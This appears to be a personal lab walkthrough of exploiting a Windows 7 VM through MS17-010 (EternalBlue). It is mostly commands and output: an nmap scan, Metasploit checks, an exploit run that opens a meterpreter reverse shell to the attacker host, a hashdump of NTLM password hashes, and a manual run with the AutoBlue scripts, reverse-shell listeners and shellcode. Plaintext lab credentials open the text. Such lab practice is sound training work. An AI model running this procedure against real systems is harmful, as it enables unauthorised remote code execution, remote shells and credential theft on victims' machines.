
User: Password123!
Administrator: Password456!

IP Address of Kali: 192.168.64.4
IP Address of Blue Machine: 192.168.64.2

============================

### Do nmap scan

```
nmap -p- -A -T4 192.168.64.2
```

##### Result

```
┌──(kali㉿kali)-[~]
└─$ nmap -p- -A -T4 192.168.64.2
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-17 14:44 PDT
Nmap scan report for 192.168.64.2
Host is up (0.0014s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  `
                 ]��      Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49155/tcp open  msrpc       Microsoft Windows RPC
49156/tcp open  msrpc       Microsoft Windows RPC
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 56:87:7c:ea:a4:b3 (unknown)
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-06-17T17:46:46-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-06-17T21:46:46
|_  start_date: 2024-06-17T21:23:42

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.37 seconds

```

###### We see in nmap the SMB port 445/tcp is open and the OS is Windows 7 Ultimate 7601 Service Pack 1 in workgroup WORKGROUP

### Search Vulnerability for Windows 7 Ultimate 7601 Service Pack 1

- https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/
	- The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer.
	- https://www.exploit-db.com/exploits/42315
-  **Search in metasploit**
```
msf6 > search eternalBlue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

##### We will use the  smb scanner option below if metasploit

3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection

Execute: `use 3`

```
msf6 > use 3
msf6 auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                Required  Description
   ----         ---------------                                --------  -----------
   CHECK_ARCH   true                                           no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                           no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                          no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlist  yes       List of named pipes to check
                s/named_pipes.txt
   RHOSTS                                                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usi
                                                                         ng-metasploit.html
   RPORT        445                                            yes       The SMB service port (TCP)
   SMBDomain    .                                              no        The Windows domain to use for authentication
   SMBPass                                                     no        The password for the specified username
   SMBUser                                                     no        The username to authenticate as
   THREADS      1                                              yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.64.2
RHOSTS => 192.168.64.2
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 192.168.64.2:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.64.2:445      - Scanned 1 of 1 hosts (100% complete)
```


### Trying another module of EternalBlue

** 0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption**

**Summary of Commands**

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.64.2
RHOSTS => 192.168.64.2
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

[*] 192.168.64.2:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.64.2:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.64.2:445      - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.64.2:445 - The target is vulnerable.
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

```
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.64.2
RHOST => 192.168.64.2
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

[*] 192.168.64.2:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.64.2:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.64.2:445      - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.64.2:445 - The target is vulnerable.
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         192.168.64.2     yes       The target host(s), see https:
                                             //docs.metasploit.com/docs/usi
                                             ng-metasploit/basics/using-met
                                             asploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain
                                             to use for authentication. Onl
                                             y affects Windows Server 2008
                                             R2, Windows 7, Windows Embedde
                                             d Standard 7 target machines.
   SMBPass                         no        (Optional) The password for th
                                             e specified username
   SMBUser                         no        (Optional) The username to aut
                                             henticate as
   VERIFY_ARCH    true             yes       Check if remote architecture m
                                             atches exploit Target. Only af
                                             fects Windows Server 2008 R2,
                                             Windows 7, Windows Embedded St
                                             andard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exp
                                             loit Target. Only affects Wind
                                             ows Server 2008 R2, Windows 7,
                                              Windows Embedded Standard 7 t
                                             arget machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh,
                                        thread, process, none)
   LHOST     192.168.64.4     yes       The listen address (an interface ma
                                        y be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST eth0
LHOST => 192.168.64.4
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.64.4:4444 
[*] 192.168.64.2:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.64.2:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.64.2:445      - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.64.2:445 - The target is vulnerable.
[*] 192.168.64.2:445 - Connecting to target for exploitation.
[+] 192.168.64.2:445 - Connection established for exploitation.
[+] 192.168.64.2:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.64.2:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.64.2:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.64.2:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.64.2:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.64.2:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.64.2:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.64.2:445 - Sending all but last fragment of exploit packet
[*] 192.168.64.2:445 - Starting non-paged pool grooming
[+] 192.168.64.2:445 - Sending SMBv2 buffers
[+] 192.168.64.2:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.64.2:445 - Sending final SMBv2 buffers.
[*] 192.168.64.2:445 - Sending last fragment of exploit packet!
[*] 192.168.64.2:445 - Receiving response from exploit packet
[+] 192.168.64.2:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.64.2:445 - Sending egg to corrupted connection.
[*] 192.168.64.2:445 - Triggering free of corrupted buffer.
[-] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 192.168.64.2:445 - Connecting to target for exploitation.
[+] 192.168.64.2:445 - Connection established for exploitation.
[+] 192.168.64.2:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.64.2:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.64.2:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.64.2:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.64.2:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.64.2:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.64.2:445 - Trying exploit with 17 Groom Allocations.
[*] 192.168.64.2:445 - Sending all but last fragment of exploit packet
[*] 192.168.64.2:445 - Starting non-paged pool grooming
[+] 192.168.64.2:445 - Sending SMBv2 buffers
[+] 192.168.64.2:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.64.2:445 - Sending final SMBv2 buffers.
[*] 192.168.64.2:445 - Sending last fragment of exploit packet!
[*] 192.168.64.2:445 - Receiving response from exploit packet
[+] 192.168.64.2:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.64.2:445 - Sending egg to corrupted connection.
[*] 192.168.64.2:445 - Triggering free of corrupted buffer.
[-] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 192.168.64.2:445 - Connecting to target for exploitation.
[+] 192.168.64.2:445 - Connection established for exploitation.
[+] 192.168.64.2:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.64.2:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.64.2:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.64.2:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.64.2:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.64.2:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.64.2:445 - Trying exploit with 22 Groom Allocations.
[*] 192.168.64.2:445 - Sending all but last fragment of exploit packet
[*] 192.168.64.2:445 - Starting non-paged pool grooming
[+] 192.168.64.2:445 - Sending SMBv2 buffers
[+] 192.168.64.2:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.64.2:445 - Sending final SMBv2 buffers.
[*] 192.168.64.2:445 - Sending last fragment of exploit packet!
[*] 192.168.64.2:445 - Receiving response from exploit packet
[+] 192.168.64.2:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.64.2:445 - Sending egg to corrupted connection.
[*] 192.168.64.2:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.64.2
[*] Meterpreter session 1 opened (192.168.64.4:4444 -> 192.168.64.2:49160) at 2024-06-17 16:40:13 -0700
[+] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
meterpreter > 

```

### Using Manual Method

1. Go to exploit database - https://www.exploit-db.com/exploits/42315
	- You can see github information there 
```
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/42315.py
```

2. Searching eternalBlue github - https://github.com/3ndG4me/AutoBlue-MS17-010
3. Clone the code to the kali
```
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git

```

Go to the AutoBlue-MS17-010 Folder - the Instructions is actually in Git
Install the required python Modules
Once the requirements were satisfied, run the python checker if everything works well

Please see below for the actual commands
```
cd AutoBlue
──(root㉿kali)-[/opt]
└─# cd AutoBlue-MS17-010 
                                                                             
┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
└─# ls
LICENSE                   eternalblue_exploit7.py  requirements.txt
README.md                 eternalblue_exploit8.py  shellcode
eternal_checker.py        listener_prep.sh         zzz_exploit.py
eternalblue_exploit10.py  mysmb.py
                                                                             
┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
└─# pip install -r requirements.txt
Requirement already satisfied: impacket in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.11.0)
Requirement already satisfied: dsinternals in /usr/lib/python3/dist-packages (from impacket->-r requirements.txt (line 1)) (1.2.4)
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
                                                                                                                       
┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
└─# python eternal_checker.py 192.168.64.2
[*] Target OS: Windows 7 Ultimate 7601 Service Pack 1
[!] The target is not patched
=== Testing named pipes ===
[*] Done
                                                                                                                       
┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
└─# 

```


**You see, when we run** `python eternal_checker.py 192.168.64.2'
**It said that it is not patched**
You can take screenshot of it

![[Pasted image 20240618173441.png]]


Go to shellcode directory and run the shell

```
──(root㉿kali)-[/opt/AutoBlue-MS17-010]
└─# cd shellcode        
                                                                                                                       
┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]
└─# ls
eternalblue_kshellcode_x64.asm  eternalblue_kshellcode_x86.asm  eternalblue_sc_merge.py  shell_prep.sh
                                                                                                                       
┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]
└─# ./shell_prep.sh 


┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]
└─# cd ..       
                                                                                                                       
┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
└─# ./listener_prep.sh 
  __
  /,-
  ||)
  \\_, )
   `--'
Eternal Blue Metasploit Listener

LHOST for reverse connection:
192.168.64.4
LPORT for x64 reverse connection:
9999
LPORT for x86 reverse connection:
2222
Enter 0 for meterpreter shell or 1 for regular cmd shell:
1

```

```
[*] Processing config.rc for ERB directives.
resource (config.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (config.rc)> set PAYLOAD windows/x64/shell/reverse_tcp
PAYLOAD => windows/x64/shell/reverse_tcp
resource (config.rc)> set LHOST 192.168.64.4
LHOST => 192.168.64.4
resource (config.rc)> set LPORT 9999
LPORT => 9999
resource (config.rc)> set ExitOnSession false
ExitOnSession => false
resource (config.rc)> set EXITFUNC thread
EXITFUNC => thread
resource (config.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
resource (config.rc)> set PAYLOAD windows/shell/reverse_tcp
PAYLOAD => windows/shell/reverse_tcp
resource (config.rc)> set LPORT 2222
LPORT => 2222
resource (config.rc)> exploit -j
[*] Exploit running as background job 1.
[*] Started reverse TCP handler on 192.168.64.4:9999 
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.64.4:2222 
msf6 exploit(multi/handler) >
```

Create a new tab and run the puython. you will notice that you Blue WIndows 7 crash (bluescreen or restarted)
```
┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
└─# python eternalblue_exploit7.py 192.168.64.2 shellcode/sc_all.bin
shellcode size: 2307
numGroomConn: 13
Target OS: Windows 7 Ultimate 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done

```